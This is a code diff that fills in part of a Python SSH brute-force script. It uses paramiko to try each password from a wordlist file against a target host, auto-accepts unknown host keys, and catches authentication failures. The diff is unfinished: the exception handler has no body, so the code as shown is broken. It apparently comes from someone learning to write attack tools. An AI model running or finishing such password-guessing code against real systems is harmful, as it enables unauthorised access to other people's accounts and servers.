@@ -16,13 +16,20 @@ if  os.path.exists(input_file) == False:
     sys.exit(1)
 
 # SSH BRUTEFORCE
-def ssh_connect(password):
-    print("SSH Connection")
-    
+def ssh_connect(password, code=0): # Code 0 means to set var code to 0 if 2nd var in function is not passed  
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    # Connecting SSH
+    try:
+        ssh.connect(host, port=22, username=username, password=password)
+    # This type of exception handles when password is incorrect
+    except paramiko.AuthenticationException: 
+        
+        
 # READING AND COMPARING PASSWORD
 with open(input_file, 'r') as file:
     for line in file.readlines():
-        password = line.strip()
+        password = line.strip() # Seperating Passwords from lines
         try:
             ssh_connect(password)
         except:
